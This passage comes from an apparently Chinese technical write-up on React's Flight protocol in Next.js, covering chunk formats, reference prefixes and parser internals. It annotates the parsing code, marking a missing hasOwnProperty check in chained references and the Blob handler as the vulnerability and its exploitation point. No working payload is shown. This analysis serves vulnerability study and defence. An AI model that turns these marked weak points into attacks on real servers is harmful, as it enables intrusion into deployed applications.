    <span class="dl">"</span><span class="s2">posts</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span><span class="dl">"</span><span class="s2">author</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Alice</span><span class="dl">"</span><span class="p">}}]</span>  <span class="c1">// user 重复传输</span>
<span class="p">}</span>

<span class="c1">// Flight 协议 - 支持引用共享</span>
<span class="mi">0</span><span class="p">:{</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Alice</span><span class="dl">"</span><span class="p">}</span>           <span class="c1">// Chunk 0: user 对象</span>
<span class="mi">1</span><span class="p">:{</span><span class="dl">"</span><span class="s2">author</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">$0</span><span class="dl">"</span><span class="p">}</span>            <span class="c1">// Chunk 1: 引用 Chunk 0</span>
<span class="mi">2</span><span class="p">:{</span><span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">$0</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">posts</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">$1</span><span class="dl">"</span><span class="p">]}</span>  <span class="c1">// Chunk 2: 根对象</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="313-flight-在-nextjs-中的使用场景"><span class="me-2">3.1.3 Flight 在 Next.js 中的使用场景</span><a href="#313-flight-在-nextjs-中的使用场景" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│                    Flight 协议使用场景                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  场景 1: 页面渲染 (Server → Client)                                     │
│  ┌────────────┐     Flight Response      ┌────────────┐                │
│  │   Server   │ ─────────────────────→  │   Client   │                │
│  │ Components │   (组件树 + 数据)        │   Hydrate  │                │
│  └────────────┘                          └────────────┘                │
│                                                                          │
│  场景 2: Server Actions (Client → Server → Client)                      │
│  ┌────────────┐     Flight Request       ┌────────────┐                │
│  │   Client   │ ─────────────────────→  │   Server   │                │
│  │   Action   │   (函数参数)             │   Action   │                │
│  └────────────┘                          └────────────┘                │
│        ↑                                       │                        │
│        │           Flight Response             │                        │
│        └───────────────────────────────────────┘                        │
│                    (返回值)                                              │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h3 id="32-flight-数据格式"><span class="me-2">3.2 Flight 数据格式</span><a href="#32-flight-数据格式" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="321-基本行格式"><span class="me-2">3.2.1 基本行格式</span><a href="#321-基本行格式" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Flight 响应是<strong>多行文本流</strong>，每行格式为：</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;id&gt;:&lt;type&gt;&lt;data&gt;
</pre></td></tr></tbody></table></code></div></div>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>部分</th>
      <th>说明</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">id</code></td>
      <td>Chunk 的数字标识符</td>
      <td><code class="language-plaintext highlighter-rouge">0</code>, <code class="language-plaintext highlighter-rouge">1</code>, <code class="language-plaintext highlighter-rouge">42</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">type</code></td>
      <td>单字符类型标识（可选）</td>
      <td><code class="language-plaintext highlighter-rouge">I</code>, <code class="language-plaintext highlighter-rouge">H</code>, <code class="language-plaintext highlighter-rouge">:</code>, <code class="language-plaintext highlighter-rouge">S</code>, <code class="language-plaintext highlighter-rouge">E</code> 等</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">data</code></td>
      <td>JSON 或特殊格式数据</td>
      <td><code class="language-plaintext highlighter-rouge">{"name":"test"}</code></td>
    </tr>
  </tbody>
</table></div>

<h4 id="322-常见类型标识"><span class="me-2">3.2.2 常见类型标识</span><a href="#322-常见类型标识" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>类型</th>
      <th>含义</th>
      <th>示例</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>(无)</td>
      <td>模型数据（JSON）</td>
      <td><code class="language-plaintext highlighter-rouge">0:{"name":"Alice"}</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">I</code></td>
      <td>模块导入</td>
      <td><code class="language-plaintext highlighter-rouge">0:I{"id":"./page.js","name":"default"}</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">H</code></td>
      <td>提示/指令</td>
      <td><code class="language-plaintext highlighter-rouge">0:H["prefetch","/api"]</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">S</code></td>
      <td>Symbol</td>
      <td><code class="language-plaintext highlighter-rouge">0:S"react.element"</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">E</code></td>
      <td>错误</td>
      <td><code class="language-plaintext highlighter-rouge">0:E{"message":"Error"}</code></td>
    </tr>
  </tbody>
</table></div>

<h4 id="323-完整-flight-响应示例"><span class="me-2">3.2.3 完整 Flight 响应示例</span><a href="#323-完整-flight-响应示例" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>0:I{"id":"./app/page.js","name":"default","chunks":["app/page"]}
1:{"name":"Alice","age":25}
2:["$","div",null,{"children":[["$","h1",null,{"children":"Hello"}],"$L3"]}]
3:{"user":"$1","loading":false}
</pre></td></tr></tbody></table></code></div></div>

<p><strong>解读</strong>：</p>
<ul>
  <li>行 0: 模块导入指令，加载 <code class="language-plaintext highlighter-rouge">./app/page.js</code></li>
  <li>行 1: 用户数据对象</li>
  <li>行 2: React 元素树，<code class="language-plaintext highlighter-rouge">$L3</code> 是延迟加载引用</li>
  <li>行 3: 页面状态，<code class="language-plaintext highlighter-rouge">$1</code> 引用行 1 的用户数据</li>
</ul>

<h3 id="33-chunk-系统详解"><span class="me-2">3.3 Chunk 系统详解</span><a href="#33-chunk-系统详解" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="331-什么是-chunk"><span class="me-2">3.3.1 什么是 Chunk</span><a href="#331-什么是-chunk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Chunk（块）是 Flight 协议的<strong>核心数据单位</strong>。每个 Chunk：</p>

<ul>
  <li>有唯一的数字 ID</li>
  <li>有状态（pending → resolved → fulfilled/rejected）</li>
  <li>可以通过 <code class="language-plaintext highlighter-rouge">$</code> 引用其他 Chunk</li>
  <li>实现了 thenable 接口（类似 Promise）</li>
</ul>

<h4 id="332-chunk-状态机"><span class="me-2">3.3.2 Chunk 状态机</span><a href="#332-chunk-状态机" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────────────────────────────────────────────┐
│                         Chunk 状态转换图                                 │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│              ┌─────────────┐                                            │
│              │   pending   │ ← 初始状态，等待数据到达                    │
│              └──────┬──────┘                                            │
│                     │                                                    │
│                     │ 收到 Flight 行数据                                 │
│                     ▼                                                    │
│           ┌─────────────────┐                                           │
│           │ resolved_model  │ ← 有原始 JSON 字符串，待解析               │
│           └────────┬────────┘                                           │
│                    │                                                     │
│                    │ 被 await 或访问 .value 时                           │
│                    │ 调用 initializeModelChunk()                         │
│                    ▼                                                     │
│     ┌──────────────────────────────────────────┐                        │
│     │                                          │                        │
│     ▼                                          ▼                        │
│ ┌─────────────┐                        ┌─────────────┐                  │
│ │  fulfilled  │ ← 解析成功，有最终值    │  rejected   │ ← 解析失败       │
│ │             │                        │             │                  │
│ │ chunk.value │                        │chunk.reason │                  │
│ │ = 解析结果  │                        │ = Error     │                  │
│ └─────────────┘                        └─────────────┘                  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
</pre></td></tr></tbody></table></code></div></div>

<h4 id="333-chunk-内部数据结构"><span class="me-2">3.3.3 Chunk 内部数据结构</span><a href="#333-chunk-内部数据结构" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="c1">// React 源码: packages/react-client/src/ReactFlightClient.js</span>

<span class="c1">// Chunk 本质是一个 ReactPromise 对象</span>
<span class="kd">function</span> <span class="nf">ReactPromise</span><span class="p">(</span><span class="nx">status</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">reason</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="nx">status</span><span class="p">;</span>      <span class="c1">// "pending" | "resolved_model" | "fulfilled" | "rejected"</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>        <span class="c1">// pending 时是监听器数组，fulfilled 时是解析结果</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">reason</span> <span class="o">=</span> <span class="nx">reason</span><span class="p">;</span>      <span class="c1">// pending 时是监听器数组，rejected 时是错误</span>
    <span class="k">this</span><span class="p">.</span><span class="nx">_response</span> <span class="o">=</span> <span class="nx">response</span><span class="p">;</span> <span class="c1">// 所属的 Response 对象</span>
<span class="p">}</span>

<span class="c1">// Chunk 继承 Promise 行为</span>
<span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nf">create</span><span class="p">(</span><span class="nb">Promise</span><span class="p">.</span><span class="nx">prototype</span><span class="p">);</span>

<span class="c1">// 关键的 then 方法实现</span>
<span class="nx">ReactPromise</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">then</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
    <span class="k">switch </span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="dl">"</span><span class="s2">fulfilled</span><span class="dl">"</span><span class="p">:</span>
            <span class="nf">resolve</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">pending</span><span class="dl">"</span><span class="p">:</span>
        <span class="k">case</span> <span class="dl">"</span><span class="s2">blocked</span><span class="dl">"</span><span class="p">:</span>
            <span class="c1">// 添加到监听器队列</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">resolve</span><span class="p">)</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">resolve</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">reject</span><span class="p">)</span> <span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">reject</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">:</span>
            <span class="c1">// ⚠️ 关键：触发解析</span>
            <span class="nf">initializeModelChunk</span><span class="p">(</span><span class="nx">chunk</span><span class="p">);</span>
            <span class="c1">// 解析后递归处理</span>
            <span class="nx">chunk</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="dl">"</span><span class="s2">rejected</span><span class="dl">"</span><span class="p">:</span>
            <span class="nf">reject</span><span class="p">(</span><span class="nx">chunk</span><span class="p">.</span><span class="nx">reason</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="334-response-对象"><span class="me-2">3.3.4 Response 对象</span><a href="#334-response-对象" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>每个 Flight 解析会话有一个 Response 对象，管理所有 Chunk：</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">createResponse</span><span class="p">(</span><span class="nx">bundlerConfig</span><span class="p">,</span> <span class="nx">formData</span><span class="p">,</span> <span class="nx">prefix</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="na">_bundlerConfig</span><span class="p">:</span> <span class="nx">bundlerConfig</span><span class="p">,</span>  <span class="c1">// Webpack/Turbopack 配置</span>
        <span class="na">_formData</span><span class="p">:</span> <span class="nx">formData</span><span class="p">,</span>            <span class="c1">// 原始 FormData（Server Action）</span>
        <span class="na">_prefix</span><span class="p">:</span> <span class="nx">prefix</span><span class="p">,</span>                <span class="c1">// Chunk ID 前缀</span>
        <span class="na">_chunks</span><span class="p">:</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">(),</span>             <span class="c1">// id → Chunk 映射</span>
        <span class="na">_closed</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>                 <span class="c1">// 流是否关闭</span>
        <span class="na">_closedReason</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>            <span class="c1">// 关闭原因</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="c1">// 从 Response 获取或创建 Chunk</span>
<span class="kd">function</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">chunk</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 从 FormData 获取数据</span>
        <span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span> <span class="o">+</span> <span class="nx">id</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">data</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">chunk</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReactPromise</span><span class="p">(</span><span class="dl">"</span><span class="s2">resolved_model</span><span class="dl">"</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">response</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">chunk</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ReactPromise</span><span class="p">(</span><span class="dl">"</span><span class="s2">pending</span><span class="dl">"</span><span class="p">,</span> <span class="p">[],</span> <span class="p">[],</span> <span class="nx">response</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">response</span><span class="p">.</span><span class="nx">_chunks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">chunk</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">chunk</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="34-特殊引用前缀系统"><span class="me-2">3.4 特殊引用前缀系统</span><a href="#34-特殊引用前缀系统" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Flight 协议使用 <code class="language-plaintext highlighter-rouge">$</code> 前缀系统来表示特殊值。当解析 JSON 时，如果字符串以 <code class="language-plaintext highlighter-rouge">$</code> 开头，会进行特殊处理。</p>

<h4 id="341-完整前缀列表"><span class="me-2">3.4.1 完整前缀列表</span><a href="#341-完整前缀列表" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="table-wrapper"><table>
  <thead>
    <tr>
      <th>前缀</th>
      <th>名称</th>
      <th>语法</th>
      <th>作用</th>
      <th>处理逻辑</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$</code></td>
      <td>Chunk 引用</td>
      <td><code class="language-plaintext highlighter-rouge">"$123"</code></td>
      <td>引用 chunk 123 的解析值</td>
      <td><code class="language-plaintext highlighter-rouge">getChunk(123).value</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$@</code></td>
      <td>原始 Chunk</td>
      <td><code class="language-plaintext highlighter-rouge">"$@123"</code></td>
      <td>获取 chunk 对象本身</td>
      <td><code class="language-plaintext highlighter-rouge">getChunk(123)</code> (不解引用)</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$L</code></td>
      <td>Lazy 引用</td>
      <td><code class="language-plaintext highlighter-rouge">"$L123"</code></td>
      <td>惰性加载的 chunk</td>
      <td>返回 lazy wrapper</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$F</code></td>
      <td>Server Function</td>
      <td><code class="language-plaintext highlighter-rouge">"$F123"</code></td>
      <td>服务端函数引用</td>
      <td>创建代理函数</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$B</code></td>
      <td>Blob 数据</td>
      <td><code class="language-plaintext highlighter-rouge">"$B123"</code></td>
      <td>二进制数据</td>
      <td><code class="language-plaintext highlighter-rouge">formData.get(prefix + "123")</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$K</code></td>
      <td>FormData</td>
      <td><code class="language-plaintext highlighter-rouge">"$K123"</code></td>
      <td>FormData 引用</td>
      <td>解析 FormData</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$Q</code></td>
      <td>Map 引用</td>
      <td><code class="language-plaintext highlighter-rouge">"$Q123"</code></td>
      <td>Map 数据结构</td>
      <td>解析为 Map</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$W</code></td>
      <td>Set 引用</td>
      <td><code class="language-plaintext highlighter-rouge">"$W123"</code></td>
      <td>Set 数据结构</td>
      <td>解析为 Set</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$n</code></td>
      <td>Number</td>
      <td><code class="language-plaintext highlighter-rouge">"$n123"</code></td>
      <td>大数字</td>
      <td><code class="language-plaintext highlighter-rouge">BigInt(123)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$u</code></td>
      <td>undefined</td>
      <td><code class="language-plaintext highlighter-rouge">"$undefined"</code></td>
      <td>undefined 值</td>
      <td><code class="language-plaintext highlighter-rouge">undefined</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$D</code></td>
      <td>Date</td>
      <td><code class="language-plaintext highlighter-rouge">"$D2024-01-01"</code></td>
      <td>日期对象</td>
      <td><code class="language-plaintext highlighter-rouge">new Date(...)</code></td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$$</code></td>
      <td>转义</td>
      <td><code class="language-plaintext highlighter-rouge">"$$abc"</code></td>
      <td>字面量 <code class="language-plaintext highlighter-rouge">$abc</code></td>
      <td><code class="language-plaintext highlighter-rouge">"$abc"</code> (去掉一个 $)</td>
    </tr>
  </tbody>
</table></div>

<h4 id="342-链式属性访问语法"><span class="me-2">3.4.2 链式属性访问语法</span><a href="#342-链式属性访问语法" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>除了简单引用，Flight 还支持链式属性访问：</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="c1">// 语法: "$&lt;chunkId&gt;:&lt;key1&gt;:&lt;key2&gt;:..."</span>
<span class="c1">// 示例: "$1:user:profile:name"</span>
<span class="c1">// 等价于: getChunk(1).value.user.profile.name</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>解析代码（漏洞所在）</strong>:</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">parseModelString</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">parentObj</span><span class="p">,</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">$</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch </span><span class="p">(</span><span class="nx">value</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="dl">'</span><span class="s1">$</span><span class="dl">'</span><span class="p">:</span>
                <span class="k">return</span> <span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">// 转义</span>
            <span class="k">case</span> <span class="dl">'</span><span class="s1">@</span><span class="dl">'</span><span class="p">:</span>
                <span class="c1">// 原始 chunk 引用</span>
                <span class="k">return</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">));</span>
            <span class="k">case</span> <span class="dl">'</span><span class="s1">B</span><span class="dl">'</span><span class="p">:</span>
                <span class="c1">// Blob 处理 ⚠️ 攻击利用点</span>
                <span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
                <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span> <span class="o">+</span> <span class="nx">id</span><span class="p">);</span>
            <span class="c1">// ... 其他类型</span>
            <span class="nl">default</span><span class="p">:</span>
                <span class="c1">// 链式引用: "$1:key1:key2"</span>
                <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
                <span class="kd">var</span> <span class="nx">colonIdx</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">:</span><span class="dl">'</span><span class="p">);</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">colonIdx</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">id</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">ref</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">colonIdx</span><span class="p">),</span> <span class="mi">16</span><span class="p">);</span>
                    <span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">ref</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="nx">colonIdx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="kd">var</span> <span class="nx">chunk</span> <span class="o">=</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nx">id</span><span class="p">);</span>
                    <span class="c1">// ⚠️ 漏洞: 直接访问属性链，无 hasOwnProperty 检查</span>
                    <span class="k">return</span> <span class="nf">loadServerReference</span><span class="p">(</span><span class="nx">chunk</span><span class="p">,</span> <span class="nx">path</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nf">getChunk</span><span class="p">(</span><span class="nx">response</span><span class="p">,</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">ref</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="343--vs--的本质区别"><span class="me-2">3.4.3 <code class="language-plaintext highlighter-rouge">$</code> vs <code class="language-plaintext highlighter-rouge">$@</code> 的本质区别</span><a href="#343--vs--的本质区别" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>这是理解漏洞的关键：</p>

<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="c1">// 假设 Chunk 0 的原始数据是: '{"name": "Alice"}'</span>

<span class="c1">// ===== "$0" - 普通引用 =====</span>
<span class="c1">// 返回解析后的 JavaScript 值</span>
<span class="nf">parseModelString</span><span class="p">(</span><span class="dl">"</span><span class="s2">$0</span><span class="dl">"</span><span class="p">)</span>
<span class="c1">// 执行流程:</span>
<span class="c1">//   1. getChunk(0) → Chunk 对象</span>
<span class="c1">//   2. 如果 status 是 "resolved_model"，调用 initializeModelChunk</span>
<span class="c1">//   3. 返回 chunk.value (解析后的值)</span>
<span class="c1">// 结果: { name: "Alice" }  ← 普通 JS 对象</span>

<span class="c1">// ===== "$@0" - 原始 Chunk 引用 =====</span>
<span class="c1">// 返回 Chunk 对象本身，不解析</span>
<span class="nf">parseModelString</span><span class="p">(</span><span class="dl">"</span><span class="s2">$@0</span><span class="dl">"</span><span class="p">)</span>
<span class="c1">// 执行流程:</span>
<span class="c1">//   1. getChunk(0) → Chunk 对象</span>
